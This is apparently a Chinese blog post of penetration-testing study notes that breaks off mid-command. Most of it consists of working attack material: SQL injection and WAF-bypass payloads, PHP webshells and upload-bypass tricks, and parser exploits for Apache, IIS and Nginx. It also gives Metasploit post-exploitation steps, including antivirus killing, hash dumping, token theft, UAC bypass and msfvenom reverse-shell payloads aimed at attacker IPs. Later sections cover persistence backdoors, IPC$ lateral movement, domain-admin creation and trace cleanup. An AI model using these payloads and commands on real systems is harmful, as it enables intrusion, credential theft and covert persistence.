title="versionedmorekeywords.py："></a>versionedmorekeywords.py：</h4><p>注释每个关键字</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS</em>//<em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h4 id="xforwardedfor-py："><a href="#xforwardedfor-py：" class="headerlink" title="xforwardedfor.py："></a>xforwardedfor.py：</h4><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-Forwarded-For”] = randomIP()return payload</p></blockquote><p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p><p><strong>适用数据库：</strong>ALL</p><h2 id="第4章-Web安全原理剖析"><a href="#第4章-Web安全原理剖析" class="headerlink" title="第4章 Web安全原理剖析"></a><strong>第4章 Web安全原理剖析</strong></h2><p>Web渗透的核心技术包括SQL注入﹑XSS攻击﹑CSRF攻击﹑SSRF攻击﹑暴力破解﹑文件上传﹑命令执行漏洞攻击﹑逻辑漏洞攻击﹑XXE漏洞攻击和WAF绕过等。本章依次将这些常见高危漏洞提取出来，从原理到利用，从攻击到防御，一一讲解。</p><p>●    SQL注入漏洞，讨论各种攻击手法，从最明显﹑最简单的方法到一系列高级攻击技巧，包括SQL注入绕过技术；</p><p>●    XSS攻击，讲解了XSS的形成原理﹑三种XSS类型﹑XSS常用语句﹑XSS编码绕过以及任何使用XSS平台测试XSS，最后提出了对XSS漏洞的修复意见；</p><p>以及CSRF漏洞﹑SSRF漏洞﹑XXE漏洞﹑暴力破解漏洞﹑命令执行漏洞﹑文件上传漏洞﹑逻辑漏洞的形成原理﹑漏洞利用﹑代码分析，以及要如何对它们进行修复。</p><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="sql注入中tips"><a href="#sql注入中tips" class="headerlink" title="sql注入中tips"></a>sql注入中tips</h3><p>布尔型注入使用burp爆破以代替手注</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252114_327.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252113_363.png" alt=""></p><p>宽字节注入原因：</p><p>数据库使用GBK，被转义符转义，</p><p>加上%df。反斜杠是%5c,连接再一起%df%5c</p><h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p>id=1</p><p>变为id=MQ%3d%3d</p><p>访问1’即为id=MSc%3d 注入的语句都使用base64编码</p><h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>x-forward-for注入</p><p>代码分析</p><p>php中的getenv()函数用于获取一个环境变量的值，类似于<code>$_server或者$_ENV</code>返回环境变量对应的值，如果环境变量不存在则返回false</p><h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>And Order </p><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>anandd绕过and过滤</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>url全编码</p><p>两次url全编码</p><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><pre><code>/*!and*/</code></pre><h3 id="sql防御"><a href="#sql防御" class="headerlink" title="sql防御"></a>sql防御</h3><p>1.过滤危险字符</p><p>2.使用预编译</p><p>pdo预编译</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>dom xss是基于dom文档对象模型的</p><p>xss绕过编码：js编码，html实体编码，url编码</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="文件后缀绕过"><a href="#文件后缀绕过" class="headerlink" title="文件后缀绕过"></a>文件后缀绕过</h4><h4 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h4><p>有些Apache允许解析其他文件后缀的，例如在http.conf中，如果配置如下代码</p><pre><code>AddType application/x-httpd-php .php .phtml</code></pre><p>所以可以上传一个后缀为phtml的Webshell。</p><ul><li>解析：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li><li>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</li></ul><h4 id="文件截断绕过"><a href="#文件截断绕过" class="headerlink" title="文件截断绕过"></a>文件截断绕过</h4><p>截断条件：php版本小于5.3.4 php的magic_quotes_gpc为OFF</p><p>假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00) 而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</p><p>实际操作：1.php%00.jpg</p><p>选中%00进行url编码</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805101116_179.png" alt=""></p><p>或者 test.asp .jpg 去burp hex中20更改00</p><h4 id="服务端检测绕过-文件类型MIME-类型检测"><a href="#服务端检测绕过-文件类型MIME-类型检测" class="headerlink" title="服务端检测绕过(文件类型MIME 类型检测)"></a>服务端检测绕过(文件类型MIME 类型检测)</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804071824_866.png" alt=""></p><p>修改Content-Type 为image/jpeg</p><h4 id="服务端验证绕过-文件完整性检测"><a href="#服务端验证绕过-文件完整性检测" class="headerlink" title="服务端验证绕过(文件完整性检测)"></a>服务端验证绕过(文件完整性检测)</h4><p>- 文件头检测 主要是在文件内容开始设置好图片文件的幻数 要绕过 jpg 文件检测就要在文件开头写上下图的值</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808281727_203.png" alt=""></p><p>在php中还存在一种类似的文件上传绕过，php函数getimagesize(可以获取图片的宽高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。</p><p>但是可以讲一个图片和一个webshell合并为一个文件，例如使用以下命令，</p><p>cat image.png webshell.php &gt; image.php</p><p>copy 1.jpg/b+lubr.php/a 1lubr.jpg</p><p>此时使用getimagesize()就获取到图片信息，且webshell的后缀是php也能被Apache解析为脚本文件</p><h4 id="服务端检测绕过-文件扩展名检测"><a href="#服务端检测绕过-文件扩展名检测" class="headerlink" title="服务端检测绕过(文件扩展名检测)"></a>服务端检测绕过(文件扩展名检测)</h4><ul><li><p>黑名单检测</p><ol><li><p>文件名大小写绕过<br> 用像 AsP，pHp 之类的文件名绕过黑名单检测</p></li><li><p>名单列表绕过<br> 用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类.还有php2、php3、</p></li><li><p>特殊文件名绕过<br> 比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式<br> 在 windows是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会<br> 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p></li><li><p>0x00 截断绕过</p><p> 截断条件：php版本小于5.3.4 php的magic_quotes_gpc为OFF</p><p> 假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00) 而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</p><p> 实际操作：1.php%00.</p><p> jpg</p><p> 选中%00进行url编码</p><p> <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805101116_179.png" alt=""></p><p> 或者 test.asp .jpg 去burp hex中20更改00</p></li><li><p>htaccess 文件攻击<br> 配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p><p> 该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下：</p><pre><code> &lt;FilesMatch &quot;_php.gif&quot;&gt;  SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code></pre><p> 保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”_php.gif”字符串的，统一按照php文件来执行。该文件在Apache里默认是启用的，如果没启用，启用方法见：<a href="http://www.jb51.net/article/25476.htm" target="_blank" rel="external">http://www.jb51.net/article/25476.htm</a> 然后就可以上传一个带一句话木马的文件，例如a_php.gif，会被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想被发现，留一个隐蔽的后门。在PHP手册中提到一句话，move_uploaded_file section,there is awarning which states‘If the destination file already exists, it will be overwritten.’服务器端如果采用了黑名单的形式限制上传，但是黑名单中却没有.htaccess文件，那么我们可以上传.htaccess文件覆盖掉原来的文件。</p></li><li><p>解析调用/漏洞绕过<br> 这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p></li></ol></li><li><p>白名单检测</p></li><li><p>.htaccess 文件攻击</p></li></ul><h4 id="服务端检测绕过-文件内容检测"><a href="#服务端检测绕过-文件内容检测" class="headerlink" title="服务端检测绕过(文件内容检测)"></a>服务端检测绕过(文件内容检测)</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804071849_233.png" alt=""></p><ul><li><p>文件幻数检测</p><p>  JPG ： FF D8 FF E0 00 10 4A 46 49 46<br>  GIF ： 47 49 46 38 39 61 (GIF89a)<br>  PNG： 89 50 4E 47</p></li><li><p>文件相关信息检测</p><p>  图像文件相关信息检测常用的就是 getimagesize()函数</p></li></ul><pre><code>只需要把文件头部分伪造好就 ok GIF89a</code></pre><p>  &lt;?php phpinfo();?&gt;</p><ul><li><p>文件加载检测</p><p>  绕过方法：<br>  针对渲染加载测试：代码注入绕过<br>  针对二次渲染测试：攻击文件加载器</p></li></ul><h4 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h4><h5 id="Apache-解析漏洞-1"><a href="#Apache-解析漏洞-1" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h5><ul><li>解析：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li><li>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</li></ul><h5 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h5><p>解析：<code>test.asp/jkl</code>,<code>IIS</code>的某些版本中会直接当成<code>asp</code>来解析;<code>test.asp;jkl</code>,<code>IIS</code>某些版本也会按照<code>asp</code>来解析；<code>任意文件名/任意文件名.php</code>，<code>IIS</code>某些版本会直接当<code>php</code>来解析</p><p>描述：</p><h5 id="IIS5-x-6-0解析漏洞"><a href="#IIS5-x-6-0解析漏洞" class="headerlink" title="IIS5.x/6.0解析漏洞"></a>IIS5.x/6.0解析漏洞</h5><p>1.<code>IIS6.0</code>在解析<code>asp</code>时有两个解析漏洞，一个是如果任意目录名包含<code>.asp</code>字符串，那么这个目录下的所有文件都会按照<code>asp</code>去解析，另一个是文件名中含有<code>asp;</code>就会优先当作<code>asp</code>来解析</p><p><strong>利用方法有两种</strong>:</p><pre><code>1. 畸形目录解析/xxxx.asp/xxx.jpg2. 分号文件解析test.asp;.jpg</code></pre><ul><li>第1种是因为xxx.jpg图片文件在某个以.asp结尾的目录下面，而被IIS当成可执行文件来解析</li><li>第2种虽然以.jpg结尾，但IIS 解析时忽略了分号”;”后面的部分，当成了test.asp文件来解析</li></ul><p>IIS7.0/7,5</p><p>在默认Fast-CGI开启状况下 </p><p>2.<code>IIS7.0/7.5</code>对php解析有类似<code>Nginx</code>的解析漏洞只要对任意文件名在url后面追加上字符串<code>/任意文件名.php</code>就会按照php去解析</p><p>上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p><h5 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h5><ul><li><p>解析：</p><ol><li><p>任意文件名/任意文件名.php</p><p> 将shell语句，如</p><pre><code> &lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p> 写在文本xx.txt中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片xx.jpg后</p><pre><code> copy xx.jpg/b + xx.txt/a test.jpg</code></pre><p> 上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p></li><li><p>任意文件名%00.php都当作php来解析</p><pre><code> xx.jpg%00.php</code></pre></li></ol></li><li><p>描述：例如原文件名test.jpg但内容包含php一句话添加为test.jpg/x.php来进行解析攻击低版本可以子任意文件名后添加%00.php进行截断攻击</p></li><li><p>对应版本：</p><p>  nginx 0.5.* [Success]</p><p>  nginx 0.6.* [Success]</p><p>  nginx 0.7 &lt;= 0.7.65 [Success]</p><p>  nginx 0.8 &lt;= 0.8.37 [Success]</p></li></ul><h4 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h4><p>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否含有webshell，如果包含则删除。</p><p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个PHP文件Mang0.php，内容为：</p><pre><code class="php">&lt;?php fputs(fopen(&quot;./shell.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;Mang0&quot;]) ?&gt;&#39;); ?&gt;</code></pre><p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的PHP的文件，利用时间差完成了webshell的上传。</p><p>防御：</p><ol><li>通过白名单</li><li>对上传的文件进行重命名，例如rand(10,99)data(“Mango”).”.jpg”</li></ol><h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。尝试将一些敏感的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。</p><h4 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h4><h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><p>垂直越权（垂直越权是指使用权限低的用户可以访问权限较高的用户）。</p><h5 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h5><p>水平越权（水平越权是指相同权限的不同用户可以互相访问）。</p><p>id=1是一个用户信息 改为id=2可以看到另一个用户信息</p><h2 id="第5章-Metasploit技术"><a href="#第5章-Metasploit技术" class="headerlink" title="第5章 Metasploit技术"></a><strong>第5章 Metasploit技术</strong></h2><p>Metasploit是近年来最强大﹑最流行和最有发展前途的开源渗透测试平台软件之一。它完全颠覆了已有的渗透测试方式。本章详细介绍了Metasploit的攻击步骤﹑信息收集﹑漏洞分析﹑漏洞利用﹑权限提升﹑移植漏洞代码模块，以及如何建立后门的实践方法。并通过具体的内网域渗透测试实例，来分析如何通过一个普通的WebShell权限一步一步获取域管权限，最终畅游整个内网。</p><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>模块是通过Metasploit框架装载集成对外提供的最核心的渗透测试功能实现代码。<br>分为</p><p>Aux（辅助模块）</p><p>Exploit（攻击模块）</p><p>Payloads（攻击载荷模块）</p><p>POST（后期渗透模块）</p><p>Encoders（编码器模块）</p><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><ul><li>启动metasploit（命令行模式） ：<code>msfconsole</code></li><li>升级metasploit：<code>msfupdate</code></li><li>查看命令使用帮助信息：<code>help [COMMAND]</code></li><li>搜索模块：<code>search</code> [模块名 //(search ms08-067)</li><li>选择模块：<code>use xxx/xxx/xxx</code></li><li>查看模块信息:<code>info</code></li><li>查看攻击载荷：<code>show payloads</code></li><li>设置攻击载荷：<code>set payload xxx/xxx/xxx</code></li><li>查看需要设置的配置参数：<code>show options</code></li><li>设置配置参数：<code>set XXXX xxxxxx</code></li><li>开始攻击：<code>exploit</code></li><li>退出当前模块:<code>back</code></li><li>退出msf : <code>exit</code></li></ul><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><p>search portscan</p><p>nmap -O -Pn/p0 192.168.11.251 不使用ping 可以穿透防火墙，皮面被防火墙发现</p><h3 id="0x00-进程迁移"><a href="#0x00-进程迁移" class="headerlink" title="0x00 进程迁移"></a>0x00 进程迁移</h3><p>刚获得meterpreter shell时，改shell极其脆弱</p><p>下一步要移动shell使他和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作，这样渗透更难被检测到</p><ol><li><p>meterpreter &gt; ps</p><p> pid   PPID   Name            </p><p> 448  3028  explore.exe</p><p> 984     448     138.exe  </p></li><li><p>meterpreter &gt; geipid 获得meterpreter shell的进程号pid984</p></li><li><p>meterpreter &gt; migrate 448  这样把shell移动到Explore.exe进程里。</p></li><li><p>meterpreter &gt; getpid</p><p> current pid：448</p></li><li><p>进程迁移完成后 原先pid为984会自动关闭 ，如果没有则可输入 kill 984 杀掉</p></li></ol><h3 id="0x01-系统命令"><a href="#0x01-系统命令" class="headerlink" title="0x01 系统命令"></a>0x01 系统命令</h3><p>sysinfo</p><p>run post/windows/gather/checkvm   检查目标机是否允许在虚拟机上</p><p>route 查看完整网络配置</p><p>run post/windows/manage/killav 命令关闭目标机杀毒软件</p><p>run post/windows/manage/enable_rdp 开启目标机远程桌面协议</p><p>run post/windows/manage/autoroute 查看网络结构</p><p>background隐藏meterpreter</p><p>然后输入 route add 命令添加路由，添加成功后输入route print命令查看，</p><p>可以看到192.168.172.0路由已经</p><p>run post/windows/gather/enum_logged_on_users 命令列举当前有多少用户登录了目标机</p><p>run post/windows/gather/enum_applications 列举安装在目标机上的应用程序</p><p>run post/windows/gather/credentials/windows_autologin 抓取字典登录的用户名和密码</p><p>meterpreter &gt;screengrab  抓取目标机的屏幕</p><h4 id="网络摄像头摄像头命令"><a href="#网络摄像头摄像头命令" class="headerlink" title="网络摄像头摄像头命令"></a>网络摄像头摄像头命令</h4><pre><code>webcam_list  #查看摄像头webcam_snap   #通过摄像头拍照webcam_stream   #通过摄像头开启视频</code></pre><p>输入shell 进入目标机shell</p><p>exit 停止meterpreter会话</p><h4 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h4><p>search -f *.txt -d c:\  搜索c盘中所有以.txt为扩展名</p><p>download c:\test.txt/root   下载c盘中的test.txt文件到攻击机root下</p><pre><code>upload /tmp/hack.txt C:\ 上传文件到目标机上</code></pre><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>meterpreter &gt; shell</p><p>whoami/groups</p><p>getuid 查看已经获得的权限</p><h5 id="1）getsystem提权"><a href="#1）getsystem提权" class="headerlink" title="1）getsystem提权"></a>1）getsystem提权</h5><pre><code>getsystem</code></pre><p>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名<br>管道.②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接<br>.③Windows服务已启动，导致与命名管道建立连接<br>.④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p><p>失败使用</p><p>sysinfo查看已打补丁</p><p>search 其他未打补丁的漏洞</p><h6 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h6><p>Token </p><p>kerberos是一种网络认证协议，通过密钥系统为客户端/服务器应用程序提供强大的认证服务：保护服务器防止错误的用户使用，同时保护它的用户使用正确的服务器，即支持双向验证。</p><p>假冒令牌实战</p><ol><li>meterpreter &gt; getuid 查看已获得权限</li><li>meterpreter &gt; getsystem 失败</li><li>meterpreter &gt; use incognito </li><li>list_tokens -u 列出可用的 token，</li><li>impersonate_token ‘NT AUTHORITY\SYSTEM’  #假冒SYSTEM token<br> 或者impersonate_token NT\ AUTHORITY\SYSTEM #不加单引号 需使用\</li></ol><h6 id="获取哈希"><a href="#获取哈希" class="headerlink" title="获取哈希"></a>获取哈希</h6><p>一、hashdump</p><p>run post/windows/gather/smart_hashdump  #从SAM导出密码哈希 需要SYSTEM权限</p><p>二、使用Quarks PwDump  </p><p>三、使用windows credentials editor </p><p>upload /root/wce.exe c:\</p><p>shell</p><p>四、使用mimikatz</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808312334_767.jpg" alt=""></p><h5 id="2）bypassuac"><a href="#2）bypassuac" class="headerlink" title="2）bypassuac"></a>2）bypassuac</h5><p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：</p><pre><code>use exploit/windows/local/bypassuacuse exploit/windows/local/bypassuac_injectionuse windows/local/bypassuac_vbsuse windows/local/ask</code></pre><p>如使用bypassuac.rb脚本：</p><pre><code>msf &gt; use exploit/windows/local/bypassuacmsf &gt; set SESSION 2msf &gt; run</code></pre><p>移植利用github 其他poc</p><ol><li><p>git clone</p></li><li><p>复制 *.rb到/usr/share/metasploit-framework/modules/exploits/windows/smb下，</p></li><li><p>ls查看是否加载完成</p></li><li><p>reload_all</p></li><li><p>search *</p></li><li><p>use  </p></li><li><p>攻击之前先生成一个dll 文件，如果目标机是32就生成32位dll</p></li><li><p>免杀使用powershell下的empire生成dll，</p></li><li><p>64位使用：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.31.147 lport=3333 -f dll -o ~/eternal11.dll</p><p> 32位使用:   msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.147 lport=3333 -f dll -o ~/eternal11.dll</p></li><li><p>exploit</p></li></ol><h3 id="0x03-后门"><a href="#0x03-后门" class="headerlink" title="0x03 后门"></a>0x03 后门</h3><h4 id="后门工具Cymothoa"><a href="#后门工具Cymothoa" class="headerlink" title="后门工具Cymothoa"></a>后门工具Cymothoa</h4><p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。由于该工具基于ptrace库，所以适合各种类Unix系统。该工具提供14种攻击载荷，可以实现各种攻击和后门。由于该后门是基于进程注入，所以当原有进程结束，后门也会被关闭。所以，渗透测试必须结合自启动脚本，注入到自启动服务中（如Web服务），才能使Cymothoa的脚本持久有效。</p><p>但是如果进程关闭或者重启，后门就停止运行。</p><ol><li>ps -aux 查看程序的pid （windows使用 tasklist）</li><li>Cymothoa -p（目标进程pid） 982 -s(shellcode编号) 1-y 3333(指定payload服务端口)</li><li>nc -nvv 192.168.31.47 4444</li></ol><h4 id="persistence"><a href="#persistence" class="headerlink" title="persistence"></a>persistence</h4><pre><code class="shell"> run persistence -h run persistence -A -S -U -i 60 -p 4231 -r 192.168.172.138</code></pre><p>选项：</p><pre><code>-P：设置Payload，默认为windows/meterpreter/reverse_tcp。该默认的payload生成的后门为32位程序。因此，当目标机器为64位系统时，留下的后门将无法运行；-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。因此，在非管理员权限或者未进行BypassUAC操作情况下，不推荐使用该参数；-i：设置反向连接间隔时间，单位为秒。当设置该参数后，目标机器会每隔设置的时间回连一次所设置的ip；-p：设置反向连接的端口号。即黑阔用来等待连接的端口；-r：设置反向连接的ip地址。即黑阔用来等待连接的ip；</code></pre><p>web后门</p><p>meterpreter后门</p><ol><li><p>msfvenom创建一个webshell     ：msfvenom -p php/meterpreter/reverse_tcp LHOST 192.168.31.247 -f raw &gt; shuteer.php </p></li><li><pre><code> msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows /meterpreter/reverse_tcp payload =&gt; windows /meterpreter/reverse_tcp msf exploit(handler) &gt; set LHOST 192.168.17.131 LHOST =&gt; 192.168.17.131 msf exploit(handler) &gt; set LPORT 6666 LPORT =&gt; 6666 msf exploit(handler) &gt; exploit</code></pre></li><li><p>打开<a href="http://127.0.0.1/shuteer.php" target="_blank" rel="external">http://127.0.0.1/shuteer.php</a></p></li><li><p>反弹成功</p></li></ol><p>aspx meterpreter后门</p><ol><li><p>```<br>show payloads</p></li></ol><p>use windows/shell_reverse_tcp</p><p>info</p><p>set lhost</p><p>set lport</p><p>save</p><pre><code>1. generate -h2. generate -t  aspx3. 上传到目标机c盘4.</code></pre><pre><code>msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows /meterpreter/reverse_tcppayload =&gt; windows /meterpreter/reverse_tcpmsf exploit(handler) &gt; set LHOST 192.168.17.131LHOST =&gt; 192.168.17.131msf exploit(handler) &gt; set LPORT 6666LPORT =&gt; 6666msf exploit(handler) &gt; run```</code></pre><h3 id="0x04-内网域渗透"><a href="#0x04-内网域渗透" class="headerlink" title="0x04 内网域渗透"></a>0x04 内网域渗透</h3><h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>提权 ms17010 ms15078</p><p>使用bypassuac提权（系统当前用户必须在管理员组，用户账号控制uac设置为默认） </p><pre><code>use exploit/windows/local/bypassuacset session 1run</code></pre><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre><code>ipconfig /all                                          查询本机IP段，所在域等  net user                                               本机用户列表    net view                                               查询同一域内机器列表    net view /domain                                       查询域列表    net view /domain:domainname                            查看workgroup域中计算机列表net group /domain                                      查询域里面的工作组   net group &quot;domain computers&quot; /domain                      查询域内所有的主机名net group &quot;domain admins&quot; /domain                      查询域管理员用户组    net group &quot;domain controllers&quot; /domain                 查看域控制器(如果有多台) net group &quot;enterprise admins&quot; /domain                      查询企业管理组net localgroup administrators                          本机管理员[通常含有域用户]    net localgroup administrators /domain                  登录本机的域管理员    net localgroup administrators workgroup\user001 /add   域用户添加到本机   net user /domain                                       查询域用户    net time /domain                                       判断主域，主域服务器都做时间服务器 net config workstation                                 当前登录域net session                                            查看当前会话 net use \\ip\ipc$ pawword /user:username               建立IPC会话[空连接­***] net share                                              查看SMB指向的路径[即共享net start                                              查看当前运行的服务 net accounts                                           查看本地密码策略 net accounts /domain                                   查看域密码策略nbtstat –A ip                                          netbios 查询  netstat –an/ano/anb                                    网络连接查询  route print                                            路由表</code></pre><h4 id="ipc-入侵实战"><a href="#ipc-入侵实战" class="headerlink" title="ipc$入侵实战"></a>ipc$入侵实战</h4><p>net use \127.0.0.21\ipc$    连接ipc共享</p><p>copy 1.exe \127.0.0.21\ipc$   复制1.exe到目标主机</p><p>net time  \127.0.0.21 查看服务器上的时间</p><p>at \127.0.0.21 10:50 1.exe <code>at</code>命令来设置定时任务</p><p>反弹meterpreter shell</p><p>handler监听</p><p>sysinfo 查看服务器信息和权限</p><p>getuid  查看权限</p><p>使用mimikatz或者hashdump抓hash</p><p>net use \127.0.0.21 \ipc$ /del 渗透完毕后删掉记录</p><h4 id="powershell寻找域管在线服务器"><a href="#powershell寻找域管在线服务器" class="headerlink" title="powershell寻找域管在线服务器"></a>powershell寻找域管在线服务器</h4><pre><code class="shell">powershell.exe -exec bypass -Command &quot;&amp;{Import-Module .\powerview.ps1;Invoke-UserHunter}&quot;`</code></pre><p>获取当域管理员在线登录的服务器，ip</p><p>主机名为pav… ip为…</p><h4 id="获取域管权限"><a href="#获取域管权限" class="headerlink" title="获取域管权限"></a>获取域管权限</h4><p>getsystem  提权</p><p>ps 找到与管理所在的进程</p><p>migrate 进程pid    把meterpreter shell进程迁移此进程</p><p>getuid</p><p>net time 查看主域控ip（一般来说时间服务器都是域服务器）</p><p>得到域服务器的主机名为PAV Ip为10.51.0.11</p><p>使用ipc$ 反弹meterpreter shell</p><p>net user mang0 pass /ad /domain 添加用户</p><p>net group “domain admins” /domain 给域控添加管理员</p><h4 id="登录域控制"><a href="#登录域控制" class="headerlink" title="登录域控制"></a>登录域控制</h4><p>具体可以看书</p><p>将最好的方式：使用metasploit下的PsExec反弹meterpreter，</p><p>注意两点</p><ul><li>MSF中的PsExec模块</li><li>cuestom模块，建议使用类似Veil生成免杀payload</li></ul><pre><code class="shell">msf auxiliary(scanner/portscan/tcp) &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; use 